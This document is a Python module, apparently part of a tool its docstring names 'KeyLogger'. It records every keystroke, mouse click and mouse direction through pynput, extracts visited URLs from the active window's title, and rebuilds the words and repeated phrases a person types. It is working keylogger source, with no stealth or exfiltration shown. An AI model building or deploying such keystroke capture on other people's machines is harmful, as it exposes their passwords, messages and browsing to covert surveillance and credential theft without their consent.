"""
Input tracking module for KeyLogger
Captures mouse, keyboard, and click events
"""

from pynput import mouse, keyboard
from datetime import datetime
from collections import defaultdict, Counter
import threading
import logging

logger = logging.getLogger(__name__)

class MouseTracker:
    """Tracks mouse movements, clicks, and direction changes"""

    def __init__(self):
        """Initialize mouse tracker"""
        self.events = []
        self.listener = None
        self.last_position = None
        self.current_direction = None
        self.direction_start_time = None
        self.direction_duration = 0

        # Direction vectors for movement tracking
        self.DIRECTION_THRESHOLD = 10  # pixels to consider a direction change

    def _get_direction(self, from_pos, to_pos):
        """
        Determine direction of mouse movement
        Returns: 'up', 'down', 'left', 'right', or None if below threshold
        """
        if from_pos is None or to_pos is None:
            return None

        dx = to_pos[0] - from_pos[0]
        dy = to_pos[1] - from_pos[1]

        # If movement is below threshold, ignore
        if abs(dx) < self.DIRECTION_THRESHOLD and abs(dy) < self.DIRECTION_THRESHOLD:
            return None

        # Determine primary direction
        if abs(dx) > abs(dy):
            return 'right' if dx > 0 else 'left'
        else:
            return 'down' if dy > 0 else 'up'

    def on_move(self, x, y):
        """
        Called when mouse moves
        Tracks direction and duration
        """
        current_pos = (x, y)
        new_direction = self._get_direction(self.last_position, current_pos)

        # Track direction change
        if new_direction and new_direction != self.current_direction:
            # Log previous direction duration if it existed
            if self.current_direction:
                duration = datetime.now() - self.direction_start_time
                self.events.append({
                    'type': 'mouse_direction',
                    'direction': self.current_direction,
                    'duration_ms': duration.total_seconds() * 1000,
                    'timestamp': self.direction_start_time
                })

            # Start tracking new direction
            self.current_direction = new_direction
            self.direction_start_time = datetime.now()

        self.last_position = current_pos

    def on_click(self, x, y, button, pressed):
        """
        Called when mouse is clicked
        Records button and position
        """
        if pressed:  # Only log on press, not release
            self.events.append({
                'type': 'mouse_click',
                'button': str(button).split('.')[-1],  # Extract button name
                'position': (x, y),
                'timestamp': datetime.now()
            })

    def start(self):
        """Start tracking mouse events"""
        try:
            self.listener = mouse.Listener(
                on_move=self.on_move,
                on_click=self.on_click
            )
            self.listener.start()
            print("[+] Mouse tracking started")
        except Exception as e:
            print(f"[-] Error starting mouse tracking: {e}")
            logger.error(f"Error starting mouse tracking: {e}")

    def stop(self):
        """Stop tracking mouse events"""
        if self.listener:
            # Log final direction duration
            if self.current_direction and self.direction_start_time:
                duration = datetime.now() - self.direction_start_time
                self.events.append({
                    'type': 'mouse_direction',
                    'direction': self.current_direction,
                    'duration_ms': duration.total_seconds() * 1000,
                    'timestamp': self.direction_start_time
                })

            self.listener.stop()
            print("[+] Mouse tracking stopped")

    def get_events(self):
        """Return all captured events"""
        return self.events

    def clear_events(self):
        """Clear captured events"""
        self.events = []


class KeyboardTracker:
    """Tracks keyboard presses"""

    def __init__(self):
        """Initialize keyboard tracker"""
        self.events = []
        self.listener = None
        self.pressed_keys = set()
        self.special_keys_down = set()  # Track which special keys are currently held

    def on_press(self, key):
        """Called when key is pressed"""
        try:
            # Get key character or name
            if hasattr(key, 'char'):
                key_data = key.char
            else:
                key_data = str(key).split('.')[-1]

            # Avoid logging the same key multiple times if held down
            if key_data not in self.pressed_keys:
                # Check if it's a special key
                is_special = any(special in key_data.lower() for special in
                               ['shift', 'ctrl', 'control', 'alt', 'cmd', 'command',
                                'tab', 'enter', 'return', 'backspace', 'delete'])

                self.events.append({
                    'type': 'key_press',
                    'key': key_data,
                    'is_special': is_special,
                    'timestamp': datetime.now()
                })
                self.pressed_keys.add(key_data)

                # Track special keys separately
                if is_special:
                    self.special_keys_down.add(key_data)

        except Exception as e:
            logger.error(f"Error processing key press: {e}")

    def on_release(self, key):
        """Called when key is released"""
        try:
            if hasattr(key, 'char'):
                key_data = key.char
            else:
                key_data = str(key).split('.')[-1]

            # Remove from pressed keys
            self.pressed_keys.discard(key_data)
            self.special_keys_down.discard(key_data)

        except Exception as e:
            logger.error(f"Error processing key release: {e}")

    def start(self):
        """Start tracking keyboard events"""
        try:
            self.listener = keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            )
            self.listener.start()
            print("[+] Keyboard tracking started")
        except Exception as e:
            print(f"[-] Error starting keyboard tracking: {e}")
            logger.error(f"Error starting keyboard tracking: {e}")

    def stop(self):
        """Stop tracking keyboard events"""
        if self.listener:
            self.listener.stop()
            print("[+] Keyboard tracking stopped")

    def get_events(self):
        """Return all captured events"""
        return self.events

    def clear_events(self):
        """Clear captured events"""
        self.events = []


class WindowTracker:
    """Tracks active windows and URLs from window titles"""

    def __init__(self):
        """Initialize window tracker"""
        self.events = []
        self.listener = None
        self.last_window_title = None
        self.current_words = []
        self.special_keys_pressed = []
        self.tracked_urls = set()
        self.last_processed_event_index = 0  # Track which events we've already processed
        self.current_word_buffer = []  # Buffer for building current word

        # Define special keys to track separately
        self.SPECIAL_KEYS = {
            'shift', 'ctrl', 'control', 'alt', 'cmd', 'command',
            'tab', 'enter', 'return', 'backspace', 'delete', 'escape',
            'up', 'down', 'left', 'right', 'home', 'end', 'pageup', 'pagedown',
            'insert', 'numlock', 'capslock', 'f1', 'f2', 'f3', 'f4', 'f5',
            'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12', 'printscreen',
            'scrolllock', 'pause', 'win', 'windows'
        }

    def _extract_words_from_keys(self, keyboard_events):
        """
        Build words from keyboard events
        Only processes NEW events since last call to avoid duplication
        Words are sequences of alphabetic characters separated by spaces/enters
        Deduplicates consecutive identical words (from backspace+retype cycles)
        """
        words = []

        # Only process new events since last call
        new_events = keyboard_events[self.last_processed_event_index:]
        self.last_processed_event_index = len(keyboard_events)

        for event in new_events:
            key = event.get('key', '').lower()

            # Check if it's a special key
            if any(special in key for special in self.SPECIAL_KEYS):
                # End current word if building one
                if self.current_word_buffer:
                    word = ''.join(self.current_word_buffer)
                    if len(word) >= 2:  # Only save words with 2+ characters
                        # Only add if different from last word (deduplicate consecutive repeats)
                        if not words or words[-1] != word:
                            words.append(word)
                    self.current_word_buffer = []

                # Track special key separately (avoid duplicates)
                if key not in self.special_keys_pressed or len(self.special_keys_pressed) == 0:
                    self.special_keys_pressed.append(key)
            # Collect alphabetic characters only (numbers as separate entities)
            elif key.isalpha():
                self.current_word_buffer.append(key)
            # Space or enter ends the word
            elif key in [' ', 'space', 'enter', 'return']:
                # Space detected - save word if it exists and meets minimum length
                if self.current_word_buffer:
                    word = ''.join(self.current_word_buffer)
                    if len(word) >= 2:  # Only save words with 2+ characters
                        # Only add if different from last word (deduplicate)
                        if not words or words[-1] != word:
                            words.append(word)
                    self.current_word_buffer = []
            else:
                # Other characters (punctuation, numbers, special symbols) - end word
                if self.current_word_buffer:
                    word = ''.join(self.current_word_buffer)
                    if len(word) >= 2:
                        # Only add if different from last word
                        if not words or words[-1] != word:
                            words.append(word)
                    self.current_word_buffer = []

        # Add newly extracted words to the total (deduplicate from session total too)
        for word in words:
            if not self.current_words or self.current_words[-1] != word:
                self.current_words.append(word)

        return words

    def _extract_phrases(self, words):
        """
        Extract only MEANINGFUL phrases from word sequences
        - Must appear at least 2+ times to be considered a phrase
        - Filters out common words and nonsensical combinations
        - Only returns high-quality phrases
        """
        if len(words) < 2:
            return []

        phrases = []

        # Common filter words to avoid meaningless phrases
        filter_words = {'a', 'an', 'the', 'is', 'am', 'are', 'or', 'and', 'of', 'to', 'in', 'on', 'at', 'by', 'as', 'i', 'be', 'do', 'go', 'no', 'it', 'we', 'me', 'he', 'up'}

        # Extract 2-word phrases (most common and meaningful)
        two_word_phrases = []
        for i in range(len(words) - 1):
            w1, w2 = words[i], words[i+1]
            # Both words should not be filter words
            if w1 not in filter_words and w2 not in filter_words:
                phrase = f"{w1} {w2}"
                # Only if it's a reasonable length
                if len(phrase) > 4:
                    two_word_phrases.append(phrase)

        # Count phrase frequencies and only keep meaningful ones (appear 2+ times)
        phrase_counter = Counter(two_word_phrases)
        for phrase, count in phrase_counter.most_common(50):
            if count >= 2:  # Only if phrase appears 2+ times
                phrases.append(phrase)

        # Extract 3-word phrases (more selective)
        three_word_phrases = []
        for i in range(len(words) - 2):
            w1, w2, w3 = words[i], words[i+1], words[i+2]
            # At most 1 filter word
            filter_count = sum(1 for w in [w1, w2, w3] if w in filter_words)
            if filter_count <= 1:
                phrase = f"{w1} {w2} {w3}"
                if len(phrase) > 8:
                    three_word_phrases.append(phrase)

        # Only keep 3-word phrases that appear 2+ times
        phrase_counter_3 = Counter(three_word_phrases)
        for phrase, count in phrase_counter_3.most_common(30):
            if count >= 2:
                phrases.append(phrase)

        return phrases

    def _extract_urls_from_title(self, title):
        """
        Extract URLs from window title
        Most browsers show URLs prominently in window titles
        Improved extraction for common browser formats
        """
        urls = []

        if not title or len(title) < 5:
            return urls

        title_lower = title.lower()

        # Skip titles that are just app names or don't contain URLs
        if not any(pattern in title_lower for pattern in ['http://', 'https://', 'www.', '.com', '.org', '.net', '.io', '.edu', '.gov']):
            return urls

        # Browser title formats:
        # Chrome/Edge: "Page Title — domain.com"
        # Firefox: "Page Title — Mozilla Firefox"
        # Safari: "Page Title"
        # The URL is usually before " - " or at the start

        potential_urls = []

        # Try different extraction strategies
        if ' — ' in title:
            parts = title.split(' — ')
            potential_urls.append(parts[0].strip())
        elif ' - ' in title:
            parts = title.split(' - ')
            potential_urls.append(parts[0].strip())
        else:
            potential_urls.append(title.strip())

        # Filter and validate extracted URLs
        for potential_url in potential_urls:
            # Must have some length and contain domain-like pattern
            if len(potential_url) > 4 and ('.' in potential_url or 'http' in potential_url.lower()):
                # Clean up the URL
                potential_url = potential_url.strip('/ ')

                # Only add if it hasn't been tracked
                if potential_url not in self.tracked_urls:
                    # Additional filter: must look like a real URL
                    if self._looks_like_url(potential_url):
                        urls.append(potential_url)
                        self.tracked_urls.add(potential_url)

        return urls

    def _looks_like_url(self, text):
        """Check if text looks like a real URL"""
        text_lower = text.lower()

        # Must have domain pattern
        has_domain = '.' in text and any(tld in text_lower for tld in
                                         ['.com', '.org', '.net', '.edu', '.gov', '.io', '.co', '.info', '.biz'])
        has_http = 'http' in text_lower

        return has_domain or has_http

    def track_window_and_words(self, keyboard_events):
        """
        Track current window and extract words/URLs
        Called periodically during session
        """
        try:
            import pygetwindow as gw

            # Get active window title
            try:
                active_window = gw.getActiveWindow()
                if active_window:
                    current_title = active_window.title

                    # Check if window changed
                    if current_title != self.last_window_title:
                        self.last_window_title = current_title

                        # Extract URLs from title
                        urls = self._extract_urls_from_title(current_title)
                        for url in urls:
                            self.events.append({
                                'type': 'window_change',
                                'window_title': current_title,
                                'url': url,
                                'timestamp': datetime.now()
                            })
            except Exception as e:
                logger.debug(f"Could not get active window: {e}")

            # Extract words from keyboard events
            if keyboard_events:
                words = self._extract_words_from_keys(keyboard_events)
                if words:
                    self.current_words.extend(words)

        except ImportError:
            logger.warning("pygetwindow not installed, skipping window tracking")
        except Exception as e:
            logger.error(f"Error tracking window: {e}")

    def get_words(self):
        """Return all extracted words"""
        return self.current_words

    def get_special_keys(self):
        """Return all special keys pressed"""
        return self.special_keys_pressed

    def get_phrases(self):
        """Return all extracted phrases from words"""
        return self._extract_phrases(self.current_words)

    def get_events(self):
        """Return all window events"""
        return self.events

    def clear_events(self):
        """Clear tracked events"""
        self.events = []
        self.current_words = []
        self.special_keys_pressed = []
        self.tracked_urls = set()
